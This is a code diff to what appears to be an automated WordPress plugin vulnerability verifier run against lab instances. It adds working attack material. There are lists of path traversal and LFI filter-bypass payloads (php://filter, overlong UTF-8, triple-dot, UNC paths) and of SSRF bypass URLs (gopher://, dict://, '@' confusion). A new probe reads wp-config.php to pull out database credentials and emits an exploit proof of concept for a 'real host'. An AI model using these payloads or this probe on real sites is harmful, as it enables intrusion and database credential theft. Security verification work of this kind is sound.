@@ -4336,6 +4336,52 @@ def verify_wordpress_url_param_login(
             lab.teardown()
 
 
+def _lfi_payloads(target_file: str, depths=(2, 4, 6, 8, 10, 12)) -> list:
+    """Return extra LFI payload variants for target_file beyond the standard '../' set.
+
+    Covers: PHP stream wrappers (php://filter), UTF-8 overlong encoding, mixed
+    slash/backslash, Windows device path, and triple-dot bypass.
+    These run after the standard encoding variants to avoid redundancy.
+    """
+    rel = target_file.lstrip("/")
+    payloads = []
+
+    # php://filter: bypasses include() extension appending and reads raw bytes as base64
+    payloads += [
+        f"php://filter/convert.base64-encode/resource={target_file}",
+        f"php://filter/read=convert.base64-encode/resource={target_file}",
+        f"php://filter/zlib.inflate/convert.base64-encode/resource={target_file}",
+    ]
+
+    # UTF-8 overlong encoding for '/' (%c0%af) and '.' (%c0%ae) — bypasses regex that
+    # only decodes ASCII before filtering (older PHP + libapache mod_rewrite combos)
+    overlong_slash = "%c0%af"
+    payloads += [
+        (overlong_slash.join([".."] * n) + overlong_slash + rel)
+        for n in depths
+    ]
+
+    # Mixed separators: forward + backslash alternating — trips up naive str_replace
+    payloads += [
+        ("../" * n).replace("/", "\\", (n // 2)) + rel
+        for n in depths if n >= 2
+    ]
+
+    # Triple-dot variant: some filters strip '..' → '..' leaving '.' (single dot = no-op)
+    # but '...' minus one '.' leaves '..' — bypasses exact-match filters on '..'
+    payloads += [
+        (".../" * n) + rel for n in depths
+    ]
+
+    # Windows device path: \\\\server\\share\\... triggers UNC fetch on Windows targets
+    payloads += [
+        "\\\\" + ("..\\\\".join([""] * (n + 1))) + target_file.replace("/", "\\")
+        for n in [2, 4]
+    ]
+
+    return payloads
+
+
 def verify_wordpress_path_traversal(
     plugin_source_dir: str, slug: str, endpoint: str, http_method: str,
     parameters, path_param_hint: str = "",
@@ -4558,6 +4604,9 @@ def verify_wordpress_path_traversal(
         attempts += [_wrap_path(("..\\" * n) + rel) for n in depths]                       # backslash (Windows)
         attempts += [_wrap_path(("....//" * n) + rel) for n in depths]                     # bypass str_replace('../','')
         attempts += [_wrap_path(rel + "%00"), _wrap_path(canary_path + "%00")]             # null-byte legacy
+        # PHP stream wrappers + overlong/triple-dot from _lfi_payloads() — these run after
+        # the basic set so early detection (canary hit) avoids sending the extra requests.
+        attempts += [_wrap_path(p) for p in _lfi_payloads(canary_path, depths)]
         # PHP-canary attempts: para LFI donde el codigo hace include/require_once con .php hardcoded
         # (ej. require_once __DIR__.'/tabs/'.$tab.'.php') -- el .txt canary no funciona porque PHP
         # lo convierte en .txt.php (inexistente). La solucion: usar paths SIN extension para que PHP
@@ -4735,8 +4784,83 @@ def verify_wordpress_path_traversal(
                                "Step 5b: PATH TRAVERSAL (browser) — /etc/passwd visible.")
                     break
             res.evidence["intentos_etc_passwd"] = tried_passwd
+        # wp-config.php probe: proves DB credential disclosure — higher impact than /etc/passwd
+        # and unique to WordPress targets.  Run only if neither canary nor passwd succeeded and
+        # there is budget left.  Any of the three DB_ constants in the response confirms the read.
+        tried_wpconfig: list = []
+        _WPCONFIG_SIGNATURE_RE = re.compile(
+            r"(DB_(?:NAME|USER|PASSWORD|HOST)|define\s*\(\s*['\"]DB_)", re.I)
+        if not found and (time.time() - t0) < budget_s - 30:
+            step("canario y /etc/passwd no se confirmaron -- probando wp-config.php "
+                 "(prueba DB credential disclosure directa)...")
+            _wpcfg_targets = [
+                "wp-config.php", "/wp-config.php",
+                # traversals at standard WordPress depths
+                *[("../" * n) + "wp-config.php" for n in depths],
+                *[("..%2f" * n) + "wp-config.php" for n in depths[:4]],
+                *[("....//" * n) + "wp-config.php" for n in depths[:4]],
+            ]
+            for _wpc_pv in _wpcfg_targets:
+                _wpc_payload = dict(base_params)
+                _wpc_payload[path_param] = _wpc_pv
+                step(f"probando {m} {endpoint} con {path_param}={_wpc_pv!r} (wp-config.php)...")
+                try:
+                    _wpc_resp = _pt_sess.request(
+                        m, boot.base_url + endpoint,
+                        data=_wpc_payload if m != "GET" else None,
+                        params=_wpc_payload if m == "GET" else None, timeout=20)
+                except Exception as _wpc_e:
+                    tried_wpconfig.append({"payload": _wpc_pv, "error": str(_wpc_e)})
+                    continue
+                _wpc_body = _wpc_resp.text or ""
+                # Also decode any base64-encoded field in the response
+                if not _WPCONFIG_SIGNATURE_RE.search(_wpc_body):
+                    import base64 as _b64_wpc, re as _re_wpc
+                    for _b64c in _re_wpc.findall(r'[A-Za-z0-9+/]{24,}={0,2}', _wpc_body):
+                        try:
+                            _dec = _b64_wpc.b64decode(_b64c + "==").decode("utf-8", errors="ignore")
+                            if _WPCONFIG_SIGNATURE_RE.search(_dec):
+                                _wpc_body = _dec
+                                break
+                        except Exception:
+                            pass
+                tried_wpconfig.append({
+                    "payload": _wpc_pv, "status": _wpc_resp.status_code,
+                    "wpconfig_sig": bool(_WPCONFIG_SIGNATURE_RE.search(_wpc_body)),
+                    "respuesta_cuerpo_recorte": (_wpc_resp.text or "")[:300],
+                })
+                if _WPCONFIG_SIGNATURE_RE.search(_wpc_body):
+                    found = True
+                    res.evidence["payload_ganador"] = _wpc_pv
+                    res.evidence["objetivo_ganador"] = "wp-config.php"
+                    res.evidence["respuesta_cuerpo_recorte"] = _wpc_body[:500]
+                    step(f"VERIFICADO: wp-config.php devuelto con {path_param}={_wpc_pv!r} "
+                         f"(DB credentials en la respuesta)")
+                    _capture_exploit_shot(
+                        boot, m, endpoint, _wpc_resp,
+                        highlight="DB_PASSWORD",
+                        caption_es=(f"PATH TRAVERSAL CONFIRMADO — wp-config.php leido. "
+                                    f"Payload: {path_param}={_wpc_pv!r}"),
+                        caption_en=(f"PATH TRAVERSAL CONFIRMED — wp-config.php read. "
+                                    f"Payload: {path_param}={_wpc_pv!r}"))
+                    break
+            res.evidence["intentos_wp_config"] = tried_wpconfig
+        res.evidence["intentos_etc_passwd"] = tried_passwd
         res.evidence["intentos"] = tried
-        if found and res.evidence.get("objetivo_ganador") == "/etc/passwd":
+        if found and res.evidence.get("objetivo_ganador") == "wp-config.php":
+            res.verified = True
+            res.ok = True
+            _pt_params_wpc = dict(base_params)
+            _pt_params_wpc[path_param] = res.evidence["payload_ganador"]
+            res.exploit_poc = _build_exploit_poc(
+                base_url=boot.base_url, endpoint=endpoint, method=m,
+                params=_pt_params_wpc, technique="path-traversal",
+                description=(f"Path traversal on '{path_param}': wp-config.php returned — "
+                              f"DB credentials exposed. Replace TARGET with the real host."))
+            res.detail = (f"PATH TRAVERSAL confirmado: la peticion con {path_param}="
+                          f"{res.evidence['payload_ganador']!r} devolvio wp-config.php "
+                          f"con DB credentials (DB_NAME/DB_USER/DB_PASSWORD/DB_HOST)")
+        elif found and res.evidence.get("objetivo_ganador") == "/etc/passwd":
             res.verified = True
             res.ok = True
             res.detail = (f"PATH TRAVERSAL confirmado: la peticion con {path_param}="
@@ -8835,6 +8959,47 @@ def verify_wordpress_sqli(
         # _lab_ref is not None: caller requested deferred teardown — skip for now.
         if _live_boot is None and _lab_ref is None:
             _finalize_lab(lab, boot, res, step, keep_lab_on_failure)
+
+
+def _ssrf_url_variants(listener_host: str, listener_ip: str, port: int, path: str) -> list:
+    """Return extra SSRF URL bypass variants beyond the standard set in build_urls().
+
+    Covers: gopher:// for blind SSRF with response smuggling, dict://, 0.0.0.0
+    shorthand, IPv6 loopback, URL credentials with '@' confusion, and encoded
+    variants that some wp_remote_get wrappers pass through without normalising.
+    These are appended to the main tried list; the main loop already handles
+    decimal/hex/octal/IPv6-mapped.
+    """
+    urls = []
+    base_path = path.lstrip("/")
+
+    # gopher:// — triggers outbound TCP connection even when wp_remote_get blocks http://;
+    # some plugins only check the scheme in an allowlist after fetching, not before.
+    urls.append(f"gopher://{listener_host}:{ port}/_GET%20%2F{base_path}%20HTTP%2F1.0%0d%0a%0d%0a")
+
+    # dict:// — triggers TCP connection; some older PHP builds accept it via CURLOPT_URL
+    urls.append(f"dict://{listener_host}:{port}/binoracle:{base_path}")
+
+    # 0.0.0.0 — binds to all interfaces; on some Linux kernels routes to loopback
+    urls.append(f"http://0.0.0.0:{port}/{base_path}")
+
+    # IPv6 loopback and unspecified — available inside the Docker bridge network
+    urls.append(f"http://[::1]:{port}/{base_path}")
+    urls.append(f"http://[::]:{port}/{base_path}")
+
+    # Credentials confusion with '@' in host — some parsers take the host after '@'
+    # as the actual destination, others take what's before ':'
+    urls.append(f"http://safe.example.com@{listener_host}:{port}/{base_path}")
+    if listener_ip:
+        urls.append(f"http://safe.example.com@{listener_ip}:{port}/{base_path}")
+
+    # URL fragment trick — some block-lists check up to '#'; the fetch ignores the fragment
+    urls.append(f"http://{listener_host}:{port}/{base_path}#https://trusted.example.com")
+
+    # Double slash after scheme — some URL parsers split on '://' and accept '///' as scheme-less
+    urls.append(f"http:/{listener_host}:{port}/{base_path}")
+
+    return urls
 
 
 def verify_wordpress_ssrf(
